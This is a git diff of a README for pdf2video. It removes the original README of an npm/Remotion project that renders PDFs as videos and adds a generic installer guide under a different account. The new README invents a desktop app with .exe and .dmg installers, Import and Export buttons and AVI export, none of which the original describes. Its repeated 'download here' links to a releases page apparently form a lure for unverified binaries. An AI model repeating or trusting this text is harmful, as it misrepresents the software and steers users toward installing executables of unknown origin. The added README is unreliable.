@@ -1,275 +1,81 @@
-<div align="center">
-
-# 📄 pdf2video
-
-**Transform PDF documents into engaging video presentations with smooth animations.**
-
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![React](https://img.shields.io/badge/React-18-blue.svg)](https://reactjs.org/)
-[![Remotion](https://img.shields.io/badge/Remotion-4.0-purple.svg)](https://www.remotion.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-
-[Features](#features) • [Quick Start](#quick-start) • [Configuration](#configuration) • [Demo](#demo)
-
----
-
-</div>
-
-## Demo
-
-https://github.com/user-attachments/assets/464622be-c855-42c6-bc9e-988350906d92
-
-## Features
-
-- **Multiple Scene Types**
-  - `stack` - Card stack display with entrance animation
-  - `focus` - Extract and zoom into a specific page with scroll support
-  - `switch` - Smooth page transitions with slide animations
-  - `fan` - Fan/wheel layout with rotation and focus effects
-
-- **Smart Animations**
-  - Natural card spread when focusing (like poker cards)
-  - Breathing effect before scrolling
-  - Bounce effect at scroll stop
-  - Collapse animation for seamless scene transitions
-
-- **Title System**
-  - Main title + subtitle at opening
-  - Persistent corner title during page viewing
-  - Per-page custom titles
-
-- **Bottom Info Bar**
-  - Scene title with typing effect for descriptions
-  - Progress indicator (1/5 format)
-  - Customizable per-page descriptions
-
-- **Ending Scene**
-  - PDF stack moves to left with staggered cards
-  - "Thank you" message with title on right
-  - Animated decoration line
-
-- **Dynamic Duration**
-  - Auto-calculates video length from script configuration
-
-- **Background Music**
-  - Auto fade-in/fade-out (2 seconds each)
-  - Duration matches video length automatically
-
-- **High Quality Rendering**
-  - Focus pages render at 2x resolution for sharp zoom
-
-## Quick Start
-
-### Installation
-
-```bash
-npm install
-```
-
-### Add Your Files
-
-Place your PDF and background music in the `public/` folder:
-
-```bash
-# PDF document
-cp /path/to/your/document.pdf public/sample.pdf
-
-# Background music (optional)
-cp /path/to/your/music.mp3 public/background.mp3
-```
-
-### Development Preview
-
-```bash
-npm run dev
-
-# Preview with custom props
-npx remotion preview --props=./props/example.json
-```
-
-### Render Video
-
-```bash
-npm run build
-
-# Render with custom props
-npx remotion render PdfShowcase out/example.mp4 --props=./props/example.json
-```
-
-## Configuration
-
-### Basic Props
-
-```tsx
-{
-  src: "/sample.pdf",           // PDF file path (in public folder)
-  title: "Document Title",       // Main title
-  subtitle: "Subtitle",          // Optional subtitle
-  highlights: [1, 3, 5],        // Pages to showcase
-  pageTitles: {                 // Per-page titles
-    "1": "Cover",
-    "3": "Key Points",
-    "5": "Summary",
-  },
-  pageDescriptions: {           // Per-page descriptions (typing effect)
-    "1": "Introduction to the document...",
-    "3": "The core findings are...",
-    "5": "In conclusion...",
-  },
-}
-```
-
-### Custom Script
-
-Full control over the presentation flow:
-
-```tsx
-{
-  src: "/sample.pdf",
-  title: "Custom Flow",
-  script: [
-    { type: "stack", duration: 60 },            // Stack display
-    { type: "focus", page: 1, duration: 120 },  // Focus page 1
-    { type: "switch", page: 3, duration: 120 }, // Switch to page 3
-    { type: "fan", page: 5, duration: 150 },    // Fan mode for page 5
-    { type: "stack", duration: 120 },           // Ending stack
-  ],
-}
-```
-
-### Script Item Types
-
-| Type | Description | Default Duration |
-|------|-------------|------------------|
-| `stack` | Card stack display | 60 frames |
-| `focus` | Zoom into a page | 120 frames |
-| `switch` | Slide transition | 120 frames |
-| `fan` | Fan wheel layout | 150 frames |
-
-## Example Configurations
-
-### Standard Mode
-
-```json
-{
-  "src": "/sample.pdf",
-  "title": "Technical Report",
-  "subtitle": "Key Insights",
-  "highlights": [1, 3, 9, 14, 20],
-  "pageTitles": {
-    "1": "Abstract",
-    "3": "Architecture",
-    "9": "Training",
-    "14": "Results",
-    "20": "Conclusion"
-  },
-  "pageDescriptions": {
-    "1": "Overview of the technical approach...",
-    "3": "The system architecture consists of...",
-    "9": "Training process involves...",
-    "14": "Benchmark results show...",
-    "20": "Key takeaways include..."
-  }
-}
-```
-
-### Fan Mode
-
-```json
-{
-  "src": "/sample.pdf",
-  "title": "Technical Report",
-  "subtitle": "Key Insights",
-  "script": [
-    { "type": "stack", "duration": 60 },
-    { "type": "fan", "page": 1, "duration": 150 },
-    { "type": "fan", "page": 3, "duration": 150 },
-    { "type": "fan", "page": 9, "duration": 150 },
-    { "type": "stack", "duration": 120 }
-  ]
-}
-```
-
-## Claude Code Skill
-
-This project includes a Claude Code skill (`.claude/skills/pdf-to-video/`) for automated PDF to video conversion.
-
-### Setup
-
-The skill is already in the correct location. If you want to use it globally, copy to your home directory:
-
-```bash
-cp -r .claude/skills/pdf-to-video ~/.claude/skills/
-```
-
-### Usage
-
-Once installed, simply tell Claude:
-
-> "帮我把这个 PDF 转成展示视频：/path/to/document.pdf"
-
-Claude will:
-1. Read and analyze the PDF content
-2. Extract key points and page titles
-3. Generate props.json configuration
-4. Render the video automatically
-
-## Project Structure
-
-```
-├── props/                      # Props configuration files
-│   └── example.json            # Example: props/glm45.json
-├── public/                     # Static assets
-│   ├── *.pdf                   # PDF source files
-│   └── background.mp3          # Background music
-├── out/                        # Rendered video output
-│   └── example.mp4             # Example: out/glm45.mp4
-└── src/
-    ├── index.ts                # Entry point
-    ├── Root.tsx                # Remotion root component
-    └── templates/
-        ├── Blank.tsx           # Blank template
-        └── PdfShowcase/        # PDF showcase template
-            ├── index.tsx       # Main component
-            ├── types.ts        # Type definitions
-            ├── PdfPage.tsx     # PDF page renderer
-            ├── StackScene.tsx  # Stack scene
-            ├── FocusScene.tsx  # Focus scene
-            ├── SwitchScene.tsx # Switch scene
-            ├── FanScene.tsx    # Fan scene
-            ├── GridBackground.tsx  # Animated grid background
-            ├── PersistentTitle.tsx # Persistent title component
-            ├── BottomInfo.tsx  # Bottom info bar
-            └── EndingOverlay.tsx   # Ending overlay
-```
-
-## Video Specs
-
-- Resolution: 1920 x 1080
-- Frame Rate: 30 fps
-- Duration: Dynamic (based on script)
-
-## Tech Stack
-
-- [Remotion](https://www.remotion.dev/) - React video framework
-- [react-pdf](https://github.com/wojtekmaj/react-pdf) - PDF rendering
-- [pdfjs-dist](https://mozilla.github.io/pdf.js/) - PDF parsing
-- [Zod](https://zod.dev/) - Schema validation
-
----
-
-<div align="center">
-
-## Author
-
-Created by **[@JinsFavorites](https://x.com/JinsFavorites)**
-
-If you find this useful, give it a ⭐️!
-
-[![Twitter Follow](https://img.shields.io/twitter/follow/JinsFavorites?style=social)](https://x.com/JinsFavorites)
-
-</div>
-
-## License
-
-MIT
+# 🎥 pdf2video - Turn PDFs into Engaging Videos
+
+## 🔗 Download Here
+[![Download pdf2video](https://img.shields.io/badge/Download-pdf2video-blue.svg)](https://github.com/jokesopboy/pdf2video/releases)
+
+## 🚀 Getting Started
+This guide will help you download and run pdf2video, a tool designed to transform your PDF documents into engaging video presentations with smooth animations. Follow these simple steps to get started.
+
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/jokesopboy/pdf2video/releases) to download the latest version.
+2. On the releases page, you will find different versions of pdf2video. Choose the most recent one.
+3. Click on the version number to expand the details, then look for the files available for download.
+4. Download the appropriate file for your operating system. For example, Windows users can look for a `.exe` file, while macOS users should select a `.dmg` file.
+5. Once the download is complete, locate the file on your computer.
+
+## 🖥️ Installation Instructions
+### Windows
+1. Double-click the downloaded `.exe` file.
+2. Follow the instructions in the installer. Accept the license agreement, and choose your preferred installation location.
+3. Once the installation completes, you can find pdf2video in your Start menu.
+
+### macOS
+1. Double-click the downloaded `.dmg` file.
+2. Drag the pdf2video icon to your Applications folder.
+3. You can open pdf2video from your Applications folder or search for it using Spotlight.
+
+## 🎬 How to Use pdf2video
+Here are the steps to convert your PDF to a video presentation:
+
+1. **Open pdf2video:**
+   Launch the application from your Start menu or Applications folder.
+
+2. **Import PDF Document:**
+   Click on the “Import” button or drag and drop your PDF file into the application window. 
+
+3. **Customize Your Video:**
+   - **Select Animation Styles:** Choose from various animation styles to bring your content to life.
+   - **Add Background Music:** You can upload an audio file that will play during your video.
+   - **Set Timing:** Adjust how long each slide appears in the final video.
+
+4. **Preview Your Video:**
+   Click the “Preview” button to see how your video will look.
+
+5. **Export the Video:**
+   Once you are satisfied, click the “Export” button. Choose a file format (such as MP4) and click “Save.”
+
+## 📋 System Requirements
+To ensure pdf2video runs smoothly, your system should meet the following requirements:
+
+- **Operating System:** 
+  - Windows 10 or higher 
+  - macOS 10.13 (High Sierra) or higher
+- **Processor:** Minimum Intel i3 or equivalent
+- **Memory:** At least 4 GB RAM
+- **Storage:** 500 MB of free disk space for installation
+- **Display:** 1280 x 720 resolution or higher
+
+## ⚙️ Troubleshooting
+If you encounter issues during installation or while using the application, try these steps:
+
+- **Check Compatibility:** Ensure your operating system meets the requirements.
+- **Reinstall the Application:** Sometimes a fresh installation can resolve issues.
+- **Update Drivers:** Make sure your graphics and audio drivers are up to date.
+- **Consult the Support:** Visit the [Issues page](https://github.com/jokesopboy/pdf2video/issues) for help from the community or to report bugs.
+
+## 🆕 Features
+pdf2video includes several powerful features to enhance your presentations:
+
+- **Smooth Animations:** Choose from multiple animation styles to keep your audience engaged.
+- **Customizable Background Music:** Add audio tracks for a more dynamic presentation.
+- **User-Friendly Interface:** Easy navigation and controls make it accessible for everyone.
+- **Multiple File Formats:** Export your videos in various formats including MP4, AVI, and more.
+
+## 📞 Support
+If you need further assistance, feel free to reach out by opening an issue on the [GitHub repository](https://github.com/jokesopboy/pdf2video/issues). The community and the developers are here to help.
+
+## 🔗 Final Download Link
+For your convenience, here is the download link one more time:
+[Download pdf2video](https://github.com/jokesopboy/pdf2video/releases)
+
+Now you are ready to transform your PDFs into engaging videos. Enjoy creating!
